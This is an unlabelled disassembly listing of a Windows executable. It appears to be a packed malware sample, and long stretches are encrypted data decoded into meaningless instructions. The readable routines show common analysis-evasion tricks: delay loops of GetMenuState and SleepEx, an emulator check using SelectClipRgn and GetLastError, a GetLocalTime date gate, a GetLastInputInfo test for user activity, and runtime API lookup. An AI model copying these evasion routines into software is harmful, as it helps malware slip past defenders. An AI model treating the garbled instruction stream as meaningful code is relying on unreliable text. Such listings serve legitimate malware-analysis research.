stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
loop r-xdata
in al 0x2c
xchg ebp eax
cmp [ edx ] edi
cmp ah ah
sub al 0x85
cmp [ edx ] edi
cmp al [ eax - 0x69694864 ]
loop r-xdata
stc
stc
stc
stc
stc
stc
stc
fisubr [ edi ]
jge r-xdata
cmp dl ch
or al 0x95
imul eax [ ebx ] 0xe20d3059
push 0x806129e2
mov bl 0x8d
xchg esi eax
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
sahf
sbb al 0x79
das
in al dx
mov ebx 0x696aec66
imul ebp [ ecx + 0x6a ] 0x52287d1c
and al 0x65
jmp r-xdata
stc
stc
cmp [ esi + 0x7480311a ] edx
fst [ esi - 0x5f13f06a ]
in al dx
test al 0xc0
mov edx 0x61afea92
sub esp ecx
xor eax 0x97eaca7c
dec ecx
adc [ eax * 8 - 0x606696a ] 0xf9
sbb [ ecx - 0x13696975 ] 0xbded66a9
rcl [ esi - 0x5f56a56a ] cl
stosb [ edi ]
stc
in ax dx
and bl [ edx - 0x717f696a ]
imul ebp [ ecx + 0x69 ] 0xfffffff9
stc
stc
stc
stc
stc
stc
add [ ecx - 0x17 ] ebp
imul ebp [ ecx + 0x3a ] 0x809d1c96
fidivr [ edi - 0x6906696a ]
sbb al 0x65
adc bh 0xad
xchg esi eax
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
pavgb mm5 [ ecx + edx * 4 ]
add dh 0xd9
xchg esi eax
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
cmp al 0x80
out 0x99 eax
xchg esi eax
xchg esi eax
add ebp [ ecx - 0x80 ]
cld
test al 0x96
xchg esi eax
stc
add ebp [ ebp - 0x1c ]
sub al 0x95
cmp [ ebx ] eax
jbe r-xdata
xchg ebp eax
cmp [ ebx ] 0xab
xchg esi eax
xchg esi eax
stc
stc
xchg esi eax
loopne r-xdata
pavgb mm5 [ ecx + esi * 4 ]
loop r-xdata
adc eax 0xc2d48039
xchg esi eax
xchg esi eax
pop edx
mov dl 0xf
loopne r-xdata
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
in ax dx
shl [ eax + 0x3d809696 ] 0xde
xchg esi eax
xchg esi eax
stc
stc
inc edx
scasb [ edi ]
in ax dx
cmp eax 0x3696968b
cmp [ esi + 0x3c9696c1 ] 0xe2
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
in al 0xec
mov eax [ 0x39969694 ]
sub cl 0xc2
xchg esi eax
xchg esi eax
stc
pavgb mm3 [ ecx + eax ]
loop r-xdata
rcl [ esi - 0x7a1dc36a ] 0x80
les ebp [ edx + 0x69 ]
imul ecx [ edi ] 0x80932ce0
mov edi [ ebp - 0x606696a ]
pavgb mm5 [ ebx + esi * 4 ]
loop r-xdata
aaa
insd
rcl [ esi - 0x1f96966a ] 0x1
xor al 0x91
add [ ebx - 0x68 ] 0x96
jpo r-xdata
or [ ebx - 0x6696943 ] 0xf9
sub al 0x93
and [ ebp - 0x51 ] 0x96
xchg esi eax
add ebx [ ebx ]
xor [ edi ] ecx
loopne r-xdata
stc
add ebx [ edx ]
xor [ ebx ] al
or [ eax - 0x69692b26 ] al
stc
cmp ebp [ ebx - 0x606696a ]
adc [ esi - 0x606696a ] ebx
loop r-xdata
stc
stc
stc
stc
stc
stc
stc
stc
stc
cmp dl ch
or al 0x95
imul ecx [ 0x6969a9c8 ] 0x952ce069
pop edx
test eax 0x96d30180
xchg esi eax
stc
stc
in al 0xec
test [ esi + edx * 4 + 0x68013996 ] edx
imul ebp [ ecx - 0x17 ] 0x967934e0
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
xchg ecx eax
pop edx
test eax 0x9696f380
xchg esi eax
and [ esi - 0x22 ] esp
mov ecx 0xd06d37e4
xchg esi eax
xchg esi eax
imul ebp [ ecx - 0x20 ] 0x43809134
cwde
xchg esi eax
test [ eax + 0x69696ac4 ] eax
pavgb mm5 [ ebx + edx * 4 ]
xchg esi eax
pavgb mm5 [ edi + edi * 4 ]
loop r-xdata
xchg esi eax
cmp [ ss : esi + 0x3c9696c1 ] 0xe2
sub_48a23f
xchg ecx eax
imul ebp [ ecx + 0x69 ] 0xec66a9ec
add ecx esp
xchg esi eax
xchg esi eax
xchg esi eax
sbb al 0x65
loop r-xdata
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
loop r-xdata
popad
in al 0x1c
jns r-xdata
stc
stc
stc
stc
stc
stc
in al dx
xchg esi eax
in ax dx
faddp st0
xchg esi eax
xchg esi eax
add [ ebx + 0x6b ] ecx
salc
jecxz r-xdata
loop r-xdata
jecxz r-xdata
stc
stc
stc
lodsd [ esi ]
mov ch 0x96
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
cmp al 0xe2
test edx ebp
test [ 0x3fa95a3a ] esi
loopne r-xdata
sub al 0x93
and [ ebp - 0x51 ] 0x96
xchg esi eax
add ebx [ ebx ]
xor [ edi ] ecx
loopne r-xdata
cmp dl ch
or al 0x95
imul ecx [ 0x6969a9c8 ] 0x952ce069
pop edx
test eax 0x96d30180
xchg esi eax
stc
stc
in al 0xec
test [ esi + edx * 4 + 0x68013996 ] edx
imul ebp [ ecx - 0x17 ] 0x967934e0
xchg esi eax
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
loopne r-xdata
xchg ebp eax
loopne r-xdata
pavgb mm5 [ ecx + esi * 4 ]
loop r-xdata
adc eax 0xc2d48039
xchg esi eax
xchg esi eax
pop edx
mov dl 0xf
loopne r-xdata
xchg ecx eax
pop edx
test eax 0x9696f380
xchg esi eax
and [ esi - 0x22 ] esp
mov ecx 0xd06d37e4
xchg esi eax
xchg esi eax
imul ebp [ ecx - 0x20 ] 0x43809134
cwde
xchg esi eax
stc
stc
stc
stc
stc
in ax dx
bound ebp [ ecx + 0x69 ]
imul edx [ esi - 0x511d72e4 ] 0x9684d381
xchg esi eax
xor [ edx - 0x57 ] bl
sub [ eax - 0x69692fff ] eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
pavgb mm2 [ ss : ecx + eax * 4 ]
add eax [ esi + esi ]
pavgb mm2 [ ebx + eax * 4 ]
xor [ esi - 0x6696978 ] 0xf9
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
loop r-xdata
cdq
sbb [ eax ] 0x39696c5
sub eax 0x960dece4
popfd
loopne r-xdata
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
in al 0xec
mov eax [ 0x39969694 ]
sub cl 0xc2
xchg esi eax
xchg esi eax
stc
pavgb mm3 [ ecx + eax ]
loop r-xdata
rcl [ esi - 0x7a1dc36a ] 0x80
les ebp [ edx + 0x69 ]
imul ecx [ edi ] 0x80932ce0
mov edi [ ebp - 0x606696a ]
pavgb mm5 [ ebx + esi * 4 ]
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
aaa
insd
rcl [ esi - 0x1f96966a ] 0x1
xor al 0x91
add [ ebx - 0x68 ] 0x96
jpo r-xdata
stc
stc
stc
stc
stc
stc
stc
stc
stc
sub bl 0xc1
xchg esi eax
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
add ecx [ ecx + 0xf ]
loopne r-xdata
jge r-xdata
xchg esi eax
xchg esi eax
aas
xchg esi eax
xchg esi eax
add ebp [ 0xffffffff960dece4 ]
xchg ecx eax
shr [ ecx + 0x69 ] 0x1
imul ebp [ ecx + 0x66 ] 0x9534e0cb
loopne r-xdata
or [ ebx - 0x6696943 ] 0xf9
cmp ebp [ ebx - 0x606696a ]
stc
add ebx [ edx ]
xor [ ebx ] al
or [ eax - 0x69692b26 ] al
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
in ax dx
shl [ eax + 0x3d809696 ] 0xde
xchg esi eax
xchg esi eax
stc
stc
inc edx
scasb [ edi ]
in ax dx
cmp eax 0x3696968b
cmp [ esi + 0x3c9696c1 ] 0xe2
adc [ esi - 0x606696a ] ebx
loop r-xdata
cdq
mov cl 0x80
popad
mov al 0x96
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
pop edx
test eax 0x96dca080
xchg esi eax
stc
stc
stc
push eax
xor eax 0xed667d4d
add [ edx - 0x4a7f696a ] 0x82
xchg esi eax
xchg esi eax
stc
in al 0xe4
mov eax [ 0xffffffff80969694 ]
add [ esi ] 0xc5
xchg esi eax
xchg esi eax
fist [ cs : esi - 0x606066a ]
or [ ecx + ecx * 4 ] 0xa9ec9696
in ax dx
and al dl
xchg esi eax
xchg esi eax
in al 0x24
shl esp 0x1
sub al 0xc1
xor [ esp + edx * 4 ] 0x96
xchg esi eax
stc
stc
stc
cmp [ ecx - 0x69693af5 ] eax
add edi [ ecx - 0x80 ]
fcomp st5
in al dx
or eax 0x3f969696
popfd
loopne r-xdata
test [ eax + 0x69696ac4 ] eax
pavgb mm5 [ ebx + edx * 4 ]
xchg esi eax
pavgb mm5 [ edi + edi * 4 ]
loop r-xdata
xchg esi eax
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
push 0xffffffa6
xlat
push ebx
push 0xffffffa6
pop edx
cwde
sub esp [ ecx ]
in al dx
ja r-xdata
xchg esi eax
xor [ ebp - 0x669697e ] 0xe4
in al 0xa1
xchg esp eax
xchg esi eax
xchg esi eax
and [ esi ] 0x99
xchg esi eax
xchg esi eax
sbb [ edx - 0x6696950 ] 0xf9
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
in al 0x2d
dec ebp
and eax 0x7e81393e
retn 0x9696
xchg ecx eax
loop r-xdata
xchg esi eax
cmp [ ss : esi + 0x3c9696c1 ] 0xe2
xchg esi eax
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
stc
sbb dh 0xd5
xchg ebp eax
loopne r-xdata
stc
stc
stc
stc
stc
pavgb mm7 [ edi + ecx * 4 ]
pavgb mm4 [ ecx + ebx * 4 ]
lea eax [ eax - 0x69693afa ]
sub_48a580
push ebx
mov edx ecx
test edx edx
jbe r-xdata
xor eax eax
pop ebx
retn
mov ebx 0x1
mov [ ecx ] 0xbe
nop
nop
inc ebx
dec edx
jne r-xdata
call sub_403068
nop
mov ecx ebx
add ecx eax
jae r-xdata
sub_48a5a8
push ebx
push 0x0
push 0x0
push 0x0
call GetMenuState
nop
mov ebx 0x94f983c
dec ebx
jne r-xdata
mov eax 0x1bb50125
call sub_4026cc
mov ebx eax
test ebx ebx
jne r-xdata
mov [ rw-data ] 0xdbed
mov ecx 0x1bb50125
xor edx edx
mov eax ebx
call sub_48a580
push 0x0
push 0x0
push 0x0
call GetMenuState
mov eax ebx
call sub_4026ec
mov ebx 0xb543
jmp r-xdata
push 0x0
push 0x0
push 0x0
call GetMenuState
dec ebx
jne r-xdata
push 0x0
call sub_484764
pop ebx
retn
sub_48a618
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_4038bc
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48a644
retn
sub_48a648
push ebx
push esi
push edi
mov edi rw-data
sub [ rw-data ] 0x1
jae r-xdata
pop edi
pop esi
pop ebx
retn
nop
mov ebx 0x1926
push 0x0
push 0x0
push 0x0
call GetMenuState
dec ebx
jne r-xdata
mov ebx 0x293c5
nop
push 0x0
push 0x0
push 0x0
call GetMenuState
dec ebx
jne r-xdata
push 0x0
push 0x0
call SelectClipRgn
nop
call GetLastError
cmp eax 0x6
jne r-xdata
mov eax 0x2b63648f
call sub_4026cc
mov ebx eax
nop
nop
test ebx ebx
je r-xdata
mov ecx 0x2b63648f
xor edx edx
mov eax ebx
call sub_48a580
mov eax ebx
call sub_4026ec
mov ebx 0x8d0f
push 0x0
push 0x0
push 0x0
call GetMenuState
dec ebx
jne r-xdata
nop
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
nop
nop
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x0
push rw-data
call GetLocalTime
cmp [ rw-data ] 0x7e1
jae r-xdata
jmp r-xdata
xor ebx ebx
nop
xor esi esi
nop
nop
jmp r-xdata
cmp eax 0x16c
jbe r-xdata
call sub_403068
nop
nop
cmp ebx 0x6
jle r-xdata
add ebx 0x1
jno r-xdata
push 0x0
push 0x0
push 0x0
call GetMenuState
push 0x0
push 0x186
call SleepEx
nop
nop
jmp r-xdata
nop
nop
call sub_48a5a8
jmp r-xdata
push 0x0
push 0x0
push 0x0
call GetMenuState
mov esi [ edi + 0x4 ]
nop
nop
call sub_403068
mov [ edi ] 0x8
nop
nop
xor eax eax
mov [ edi + 0x4 ] eax
nop
push 0x0
push 0x0
push 0x0
call GetMenuState
push edi
call GetLastInputInfo
mov eax [ edi + 0x4 ]
sub eax esi
jae r-xdata
push 0x0
push 0x0
push 0x0
call GetMenuState
sub_48a7cd
add [ eax ] al
add [ edi ] dh
xor eax 0x577a4946
push ebp
inc ebp
push edx
pop eax
inc esi
jno r-xdata
add [ eax ] al
sbb [ eax + 0x5fa40048 ] ch
inc eax
add [ edi + ebx * 2 + 0x40 ] dh
add [ eax + 0x4400405d ] bl
pop ebp
inc eax
add [ eax ] bl
inc eax
add ah ch
pop edi
inc eax
add [ eax + 0x6000406d ] dl
insd
inc eax
add al cl
insd
inc eax
add [ eax + 0x1c00406d ] bl
push edi
xor al 0x56
imul ebp [ ecx + 0x30 ] 0x63
jbe r-xdata
add [ eax ] dh
mov ebp 0xd7f80042
inc edx
add [ eax - 0x3fffbd29 ] bh
mov [ edx ] r-xdata
inc eax
add [ eax - 0x43ffbf90 ] dh
fadd [ eax ]
cmp al 0xd7
inc eax
add [ eax ] ch
loope r-xdata
inc ecx
add ah ch
push esi
inc ecx
add al ah
jo r-xdata
enter 0x406d 0x0
cwde
insd
inc eax
add [ edi + edx * 2 ] bl
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_48a807
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48a80e
retn
int3
add ah cl
jle r-xdata
rol [ edx ] 0x10
add [ eax + 0x400042c7 ] dl
add al bh
loopne r-xdata
pushfd
hlt
add [ eax ] al
enter 0x42 0xd0
mov [ edx ] sub_45e4b8
dec eax
in al 0x45
add [ eax ] bh
fld [ edx ]
or ch bl
inc edx
add al ah
out 0x42 al
add [ esi - 0xbd3ffbe ] cl
inc edx
add ah bh
inc edx
add ah dh
inc edx
add ah al
inc edx
add [ ebx + esi * 8 - 0xc73ffbe ] bh
inc edx
add [ ebx + esi * 8 - 0xcabffbe ] al
inc edx
add ah cl
hlt
rol [ edx ] 0x40
and al 0x42
add [ eax ] dl
and al 0x42
add [ ecx + edi * 4 + 0x42 ] ah
add [ eax - 0x3ffbd48 ] dl
jle r-xdata
add [ eax - 0x40 ] al
inc edx
add [ eax ] dl
add [ eax + 0x47 ] cl
inc ecx
add al dl
inc esi
inc ecx
add [ ecx + ecx * 2 ] dl
inc ecx
add ah ah
dec eax
inc ecx
add ah al
push esi
inc ecx
add [ esi + edx * 2 + 0x41 ] dh
add [ eax ] ah
inc edx
add [ edi + ebx + 0x42 ] dh
add [ eax + 0x700042ba ] ah
mov edx 0xbd600042
inc edx
sub_48a810
inc esp
add [ eax ] al
add [ eax ] bl
test al 0x48
add [ edi + ebx * 2 + 0x5f740040 ] ah
inc eax
add [ eax + 0x4400405d ] bl
pop ebp
inc eax
add [ eax ] bl
inc eax
add ah ch
pop edi
inc eax
add [ eax + 0x6000406d ] dl
insd
inc eax
add al cl
insd
inc eax
add [ eax + 0x1c00406d ] bl
push edi
inc ecx
add ah ch
push esi
inc ecx
add al ah
jo r-xdata
add [ eax ] dh
mov ebp 0xd7f80042
inc edx
add [ eax - 0x3fffbd29 ] bh
mov [ edx ] r-xdata
inc eax
add [ eax - 0x43ffbf90 ] dh
fadd [ eax ]
cmp al 0xd7
inc eax
add [ eax ] ch
loope r-xdata
int3
add ah cl
jle r-xdata
rol [ edx ] 0x10
add [ eax + 0x400042c7 ] dl
add al bh
loopne r-xdata
pushfd
hlt
add [ eax ] al
enter 0x42 0xd0
mov [ edx ] sub_45e4b8
dec eax
in al 0x45
add [ eax ] bh
fld [ edx ]
or ch bl
inc edx
add al ah
out 0x42 al
add [ esi - 0xbd3ffbe ] cl
inc edx
add ah bh
inc edx
add ah dh
inc edx
add ah al
inc edx
add [ ebx + esi * 8 - 0xc73ffbe ] bh
inc edx
add [ ebx + esi * 8 - 0xcabffbe ] al
inc edx
add ah cl
hlt
rol [ edx ] 0x40
and al 0x42
add [ eax ] dl
and al 0x42
add [ ecx + edi * 4 + 0x42 ] ah
add [ eax - 0x3ffbd48 ] dl
jle r-xdata
add [ eax - 0x40 ] al
inc edx
add [ eax ] dl
add [ eax + 0x47 ] cl
inc ecx
add al dl
inc esi
inc ecx
add [ ecx + ecx * 2 ] dl
inc ecx
add ah ah
dec eax
inc ecx
add ah al
push esi
inc ecx
add [ esi + edx * 2 + 0x41 ] dh
add [ eax ] ah
inc edx
add [ edi + ebx + 0x42 ] dh
add [ eax + 0x700042ba ] ah
mov edx 0xbd600042
inc edx
_start
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax sub_48a810
call sub_405f30
mov eax [ rw-data ]
mov eax [ eax ]
call sub_469488
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_4694a0
mov eax [ rw-data ]
mov eax [ eax ]
call sub_469520
call sub_403dc8
sub_40115f
add [ esp + 0x4 ] 0xfffffff8
jmp sub_405888
sub_401169
add [ esp + 0x4 ] 0xfffffff8
jmp sub_40589c
sub_40122c
jmp [ __import_lookup_table_1(user32:CharNextA) ]
ExitProcess
jmp [ __import_lookup_table_0(kernel32:ExitProcess) ]
sub_40123c
jmp [ __import_lookup_table_1(user32:MessageBoxA) ]
sub_401244
jmp [ __import_lookup_table_0(kernel32:FindClose) ]
sub_40124c
jmp [ __import_lookup_table_0(kernel32:FindFirstFileA) ]
sub_401254
jmp [ __import_lookup_table_0(kernel32:FreeLibrary) ]
GetCommandLineA
jmp [ __import_lookup_table_0(kernel32:GetCommandLineA) ]
sub_401264
jmp [ __import_lookup_table_0(kernel32:GetLocaleInfoA) ]
sub_40126c
jmp [ __import_lookup_table_0(kernel32:GetModuleFileNameA) ]
sub_401274
jmp [ __import_lookup_table_0(kernel32:GetModuleHandleA) ]
sub_40127c
jmp [ __import_lookup_table_0(kernel32:GetProcAddress) ]
GetStartupInfoA
jmp [ __import_lookup_table_0(kernel32:GetStartupInfoA) ]
sub_40129c
jmp [ __import_lookup_table_1(user32:LoadStringA) ]
MultiByteToWideChar
jmp [ __import_lookup_table_0(kernel32:MultiByteToWideChar) ]
sub_4012bc
jmp [ __import_lookup_table_2(advapi32:RegCloseKey) ]
WideCharToMultiByte
jmp [ __import_lookup_table_0(kernel32:WideCharToMultiByte) ]
sub_4012dc
jmp [ __import_lookup_table_0(kernel32:VirtualQuery) ]
SysAllocStringLen
jmp [ __import_lookup_table_3(oleaut32:SysAllocStringLen) ]
SysReAllocStringLen
jmp [ __import_lookup_table_3(oleaut32:SysReAllocStringLen) ]
SysFreeString
jmp [ __import_lookup_table_3(oleaut32:SysFreeString) ]
InterlockedIncrement
jmp [ __import_lookup_table_0(kernel32:InterlockedIncrement) ]
InterlockedDecrement
jmp [ __import_lookup_table_0(kernel32:InterlockedDecrement) ]
sub_40130c
jmp [ __import_lookup_table_0(kernel32:GetCurrentThreadId) ]
sub_40131c
push ebx
add esp 0xffffffbc
mov ebx 0xa
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
mov eax ebx
add esp 0x44
pop ebx
retn
movzx ebx [ esp + 0x30 ]
sub_401340
jmp [ __import_lookup_table_0(kernel32:LocalAlloc) ]
VirtualFree
jmp [ VirtualFree@IAT ]
sub_401360
jmp [ __import_lookup_table_0(kernel32:InitializeCriticalSection) ]
sub_401368
jmp [ __import_lookup_table_0(kernel32:EnterCriticalSection) ]
sub_401370
jmp [ __import_lookup_table_0(kernel32:LeaveCriticalSection) ]
sub_401378
jmp [ __import_lookup_table_0(kernel32:DeleteCriticalSection) ]
sub_401ac2
jmp sub_4038bc
sub_401ac9
mov al [ rw-data ]
pop ebp
retn
sub_401ba6
jmp sub_4038bc
sub_401c74
inc [ rw-data ]
mov edx eax
sub edx 0x4
mov edx [ edx ]
and edx 0x7ffffffc
sub edx 0x4
add [ rw-data ] edx
call sub_402288
retn
sub_402274
jmp sub_4038bc
sub_40241a
jmp sub_4038bc
sub_4026b9
jmp sub_4038bc
sub_40277c
call sub_405ee4
cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
call sub_405ee4
mov eax [ eax ]
mov eax [ eax + 0x4 ]
retn
sub_4027d0
mov [ rw-data ] edx
call sub_403ea0
sub_402834
push eax
push edx
push ecx
call sub_405ee4
cmp [ eax + 0x4 ] 0x0
pop ecx
pop edx
pop eax
jne r-xdata
xor eax eax
jmp sub_402828
retn
sub_402850
retn
sub_4028a4
retn
sub_4028a8
push ebx
call sub_405ee4
mov ebx [ eax + 0x4 ]
call sub_405ee4
xor edx edx
mov [ eax + 0x4 ] edx
mov eax ebx
pop ebx
retn
sub_402914
mov [ rw-data ] ax
fnclex
fldcw [ rw-data ]
retn
sub_402924
push 0x0
fnstcw [ esp ]
pop eax
retn
sub_4029c0
mov edx [ eax + 0x1c ]
call sub_402978
retn
sub_402c28
mov ecx 0xff
call sub_402c34
retn
sub_402c58
push esi
push edi
mov esi eax
mov edi edx
and ecx 0xff
[ esi ] [ edi ]
pop edi
pop esi
retn
j_sub_402c74
jmp sub_402c74
sub_402c71
retn
sub_403001
jmp sub_4038bc
sub_403054
fninit
fwait
fldcw [ rw-data ]
retn
sub_4030b4
mov eax [ eax - 0x24 ]
test eax eax
je r-xdata
retn
mov eax [ eax ]
sub_4030c0
push ebx
mov ebx eax
mov eax ebx
call sub_4030f0
call sub_4026cc
mov edx eax
mov eax ebx
call sub_403134
pop ebx
retn
sub_4030dc
push ebx
mov ebx eax
mov eax ebx
call sub_40318c
mov eax ebx
call sub_4026ec
pop ebx
retn
sub_4030f0
add eax 0xffffffd8
mov eax [ eax ]
retn
sub_403118
call sub_4034f4
test dl dl
jle r-xdata
retn
call sub_4034dc
sub_4031d8
retn
sub_403260
jmp sub_4038bc
sub_403267
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_403370
mov eax 0x8000ffff
retn
sub_403378
retn
sub_40337c
retn
sub_403380
retn
sub_4034b5
jmp sub_403608
sub_4034ba
mov eax [ esp + 0x2c ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
call sub_40391c
retn
mov ecx [ eax ]
mov dl 0x81
push eax
call [ ecx - 0x4 ]
pop eax
call sub_4034dc
sub_4034dc
mov edx [ eax ]
call [ edx - 0x8 ]
retn
sub_4034e4
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx - 0x1c ]
mov eax ebx
pop ebx
retn
sub_4034f4
test dl dl
jg r-xdata
push eax
push edx
mov edx [ eax ]
call [ edx - 0x18 ]
pop edx
pop eax
retn
retn
sub_403504
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push 0x0
push 0x0
push 0x0
push 0xeedfadf
call [ rw-data ]
sub_4035cc
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push edx
push esp
push 0x1
push 0x0
push 0xeedfae2
call [ rw-data ]
pop edx
sub_4035e8
push eax
push edx
cmp [ rw-data ] 0x1
jbe r-xdata
pop edx
pop eax
retn
push esp
push 0x2
push 0x0
push 0xeedfae3
call [ rw-data ]
sub_4039b5
retn
sub_403af8
xor edx edx
lea eax [ ebp - 0xc ]
mov ecx [ fs : edx ]
mov [ fs : edx ] eax
mov [ eax ] ecx
mov [ eax + 0x4 ] r-xdata
mov [ eax + 0x8 ] ebp
mov [ rw-data ] eax
retn
sub_403b86
jmp sub_403608
sub_403be6
jmp sub_403608
sub_403c00
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] edx
mov eax [ edx + 0x4 ]
mov [ rw-data ] eax
call sub_403af8
mov [ rw-data ] 0x0
call sub_403ba0
retn
sub_403d39
retn
sub_403e9b
pop ebp
pop edi
pop esi
pop ebx
retn
sub_403ea0
mov [ rw-data ] eax
call sub_403dc8
sub_4040dc
retn
sub_404118
retn
sub_404126
retn
sub_40413f
retn
sub_404150
retn
sub_404237
retn
sub_404368
test eax eax
je r-xdata
retn
mov edx [ eax - 0x8 ]
inc edx
jle r-xdata
[ eax - 0x8 ]
j_sub_404384#2
jmp sub_404384
sub_4043cd
retn
sub_4043d5
retn
sub_404417
retn
sub_40459c
test eax eax
je r-xdata
retn
push eax
push 0x0
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402828
sub_4045b4
xchg [ eax ] edx
test edx edx
je r-xdata
retn
push edx
call SysFreeString
sub_40470c
retn
sub_40471e
retn
sub_404720
test eax eax
je r-xdata
mov eax r-xdata
retn
retn
sub_404914
mov ecx 0x1
jmp sub_404880
sub_40491e
retn
sub_404954
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402828
call [ rw-data ]
retn
sub_404a58
mov ecx 0x1
jmp sub_40496c
sub_404a62
retn
sub_404a64
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402828
call [ rw-data ]
retn
sub_404c8a
retn
sub_404c8c
push edx
call sub_4026cc
pop edx
test eax eax
je r-xdata
retn
push eax
call sub_404914
pop eax
sub_404ca0
push eax
call sub_404a58
pop eax
call sub_4026ec
retn
sub_404cb0
mov al 0x11
jmp sub_402828
sub_404cdb
retn
sub_404f1c
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_404b98
pop ebp
retn 0x4
j_sub_40496c
jmp sub_40496c
sub_404f31
retn
sub_404f34
call sub_4050d4
retn
sub_405160
call sub_405138
retn
sub_4054a9
jmp sub_4038bc
sub_405614
call sub_40561c
retn
sub_405648
call sub_405658
retn
sub_405650
call sub_405678
retn
sub_405658
push ebx
mov ebx eax
mov eax 0x8
call sub_4026cc
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
pop ebx
retn
sub_405713
jmp sub_403608
sub_405734
mov edx [ rw-data ]
mov [ eax ] edx
mov [ rw-data ] eax
retn
sub_4057a8
jmp sub_4038bc
sub_4057af
pop ecx
pop ebp
retn
sub_405828
test eax eax
je r-xdata
retn
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
sub_405834
add eax 0x4
push eax
call InterlockedDecrement
retn
sub_405840
cmp [ eax + 0x4 ] 0x0
je r-xdata
retn
mov al 0x2
call sub_402828
sub_405850
call sub_4030c0
mov [ eax + 0x4 ] 0x1
retn
sub_405888
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call InterlockedIncrement
pop ebp
retn 0x4
sub_405b77
jmp sub_4038bc
sub_405b7e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405c1b
jmp sub_4038bc
sub_405c22
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405c6b
jmp sub_4038bc
sub_405c72
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405d36
jmp sub_4038bc
sub_405d3d
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_405d8e
jmp sub_4038bc
sub_405d95
pop ebp
retn
sub_405e6c
jmp [ __import_lookup_table_4(kernel32:GetModuleHandleA) ]
LocalAlloc
jmp [ LocalAlloc@IAT ]
TlsSetValue
jmp [ TlsSetValue@IAT ]
sub_405e8c
push eax
push 0x40
call LocalAlloc
retn
sub_405e98
mov eax 0x40
retn
sub_405f24
mov eax rw-data
call sub_405734
retn
sub_405f99
jmp sub_4038bc
sub_405fa0
pop ebp
retn
sub_405fa4
sub [ rw-data ] 0x1
retn
sub_405fac
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] ecx
pop ebx
pop ebp
retn 0x8
sub_405fc8
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
retn
sub_406011
jmp sub_4038bc
sub_406018
pop ebp
retn
sub_40601c
sub [ rw-data ] 0x1
retn
RegCloseKey
jmp [ RegCloseKey@IAT ]
RegOpenKeyExA
